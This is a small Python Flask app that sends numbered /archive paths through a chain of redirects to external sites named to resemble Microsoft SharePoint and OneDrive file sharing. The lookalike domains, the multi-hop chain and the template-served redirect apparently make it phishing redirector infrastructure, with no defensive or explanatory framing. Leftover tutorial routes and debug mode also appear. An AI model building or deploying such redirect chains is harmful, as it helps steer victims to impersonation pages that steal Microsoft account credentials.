from flask import Flask, request, render_template

app = Flask(__name__)

# Define redirection rules based on path
def get_redirect_url(path):
    if path == '/archive1':
        return 'https://sharepoint-secure.vercel.app/'
    elif path == '/archive249':
        return 'https://secure-file-share-rho.vercel.app/'
    elif path == '/archive3':
        return 'https://secure-sharing.vercel.app/archive4'
    elif path == '/archive4':
        return 'https://secure-sharing.vercel.app/archive5'
    elif path == '/archive5':
        return 'https://secure-sharing.vercel.app/archive6'
    elif path == '/archive6':
        return 'https://secure-sharing.vercel.app/archive7'
    elif path == '/archive7':
        return 'https://secure-sharing.vercel.app/archive8'
    elif path == '/archive8':
        return 'https://onedrive-sharing.vercel.app/'
    elif path == '/archive3467':
        return 'https://theme.redon.ae/archive/'
    elif path == '/archive9':
        return 'https://onedrive-sharing.vercel.app/'
    # Add more cases for additional paths and intermediary URLs as needed
    else:
        return 'https://onedrive-sharing.vercel.app/'

# Route to handle redirection for paths '/path1' to '/path8'
@app.route('/archive<int:num>')
def path_handler(num):
    path = f'/archive{num}'
    redirect_url = get_redirect_url(path)
    return render_template('redirect.html', redirect_url=redirect_url)

# Route for the main page
@app.route('/hello')
def hello():
    return 'Hello, world'

# Route for testing
@app.route('/test')
def test():
    return 'Test'

# Route for displaying results
@app.route('/result')
def result():
    scores = {'phy': 50, 'che': 60, 'maths': 70}
    return render_template('result.html', result=scores)

if __name__ == '__main__':
    app.run(debug=True)
